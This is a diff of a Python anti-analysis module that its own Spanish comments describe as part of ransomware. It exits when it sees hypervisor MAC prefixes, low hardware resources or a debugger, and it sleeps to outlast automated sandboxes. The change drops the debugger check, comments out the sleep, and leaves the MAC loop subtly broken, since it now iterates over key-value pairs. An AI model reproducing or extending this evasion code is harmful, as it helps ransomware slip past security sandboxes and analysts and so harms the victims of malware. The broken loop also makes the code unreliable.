@@ -34,16 +34,16 @@ def get_mac_address(): # Coger MAC de la primera interfaz de red
     return mac.upper()
 
 def check_hypervisor_mac(mac): # Comprobación de la MAC
-    for hypervisor, prefixes in MAC_PREFIXES.items():
+    for prefixes in MAC_PREFIXES.items():
         if any(mac.startswith(prefix) for prefix in prefixes):
-            sys.exit(1)  # Detiene el programa si se detecta un hipervisor
+            sys.exit(1)  # Detiene el programa si se detecta la MAC de un hipervisor
     return None
 
-def check_system_requirements(): #Comprobación de requerimientos de hardware, si no cumple está en un entorno virtualizado
+def check_system_requirements(): #Comprobación de requerimientos de hardware
     cpu_cores = psutil.cpu_count(logical=False)  #
     ram = psutil.virtual_memory().total / (1024 ** 3)  
     disk = psutil.disk_usage('/').total / (1024 ** 3)  
-
+    
     if disk < 64 or ram < 4 or cpu_cores < 2:
         sys.exit(1)
 
@@ -53,15 +53,10 @@ def is_debugger_present_windows():
     except AttributeError:
         return False
 
-def check_virtualization_and_debugging():
-    evasive_sleep(10)  # Función para dormir el ransowmare durante el tiempo específicado, sandboxes automátizados 3-5 min
-    so = so_detection()
-    if so == "Windows": # Verificar depurador en Windows
-        if is_debugger_present_windows():
-            print("[!] Depurador detectado mediante IsDebuggerPresent.")
-            sys.exit(1)
+def check_virtualization():
+    #evasive_sleep(300)  # Función para dormir el ransowmare durante el tiempo especifícado
     check_hypervisor_mac(get_mac_address()) # Comprobación MAC
     check_system_requirements() # Comprobación de recursos hardware 
     
 if __name__ == "__main__":
-    check_virtualization_and_debugging()
+    check_virtualization()
